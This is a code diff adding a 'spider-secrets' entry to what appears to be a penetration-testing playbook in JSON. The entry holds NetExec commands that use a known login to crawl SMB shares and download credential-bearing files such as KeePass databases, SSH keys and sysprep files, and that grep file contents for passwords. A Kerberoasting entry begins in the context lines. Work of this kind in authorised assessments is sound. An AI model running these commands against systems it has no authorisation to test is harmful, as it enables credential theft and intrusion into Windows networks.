@@ -663,6 +663,54 @@
       ]
     },
     {
+      "id": "spider-secrets",
+      "title": "Filter Spidered Shares for Secrets",
+      "hypothesis": "A raw share spider is a haystack; the win is the needle. Re-run the crawl with a credential-material filter (or grep the manifest you already pulled) so only the files that routinely hold secrets surface: Groups.xml, web.config, unattend/sysprep, *.kdbx, *.bak/backups, id_rsa, .ps1/.config, connection strings. Pull and inspect those; they are candidate credentials, not proven ones.",
+      "tool": "nxc",
+      "tools": [
+        "nxc"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "loot.files",
+        "smb.authenticated",
+        "credential.available",
+        "smb.null_session"
+      ],
+      "produces": [
+        "credential.candidate",
+        "loot.material"
+      ],
+      "priority": 68,
+      "phase": "loot",
+      "proves": "surfaces the files from a share spider whose names match credential-material hints, the candidate secrets to pull",
+      "does_not_prove": "a validated credential; a matched filename is a lead to download and inspect, never a proven secret until its contents are read",
+      "report": {
+        "finding": "Credential-Bearing Files on Readable SMB Shares",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.netexec.wiki/smb-protocol/spidering-shares"
+      ],
+      "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M spider_plus -o DOWNLOAD_FLAG=True PATTERN='.kdbx .bak unattend sysprep web.config .config id_rsa .ps1 passw cred backup .ovpn .ppk .pfx'",
+          "note": "PREFERRED, from Kali: spider_plus with a PATTERN filter downloads only the credential-bearing files (DOWNLOAD_FLAG=True), so you skip the haystack and go straight to the needles. obol flags matching names as candidate credentials."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --spider {{share}} --regex '(?i)(passw|cred|secret|\\.kdbx|\\.config|unattend|id_rsa|\\.bak)' --content",
+          "note": "Content grep: --content searches INSIDE files on the named share for the regex, catching secrets in files whose names don't give them away. Point {{share}} at SYSVOL, a profiles share, or wherever the inventory showed readable data."
+        },
+        {
+          "tool": "sh",
+          "run": "jq -r '.[][] | .name' /tmp/nxc/*_spider_plus/*.json 2>/dev/null | grep -iE 'passw|cred|secret|\\.kdbx|\\.bak|unattend|web\\.config|id_rsa|\\.ps1|\\.ovpn|\\.ppk|\\.pfx|backup'",
+          "note": "Offline fallback: if you already ran a plain spider, grep its saved JSON manifest for the same credential-material names, no re-crawl needed. Paste the matching lines into Evidence."
+        }
+      ]
+    },
+    {
       "id": "kerberoast",
       "title": "Kerberoasting",
       "hypothesis": "Any authenticated domain user can request service tickets (TGS) for SPN-bearing accounts (usually service accounts) and each ticket is encrypted with that account's password hash. Pull them all and crack offline. Service accounts tend to have weak passwords and too many rights, which is why this is the standard opening move once you hold any domain credential.",
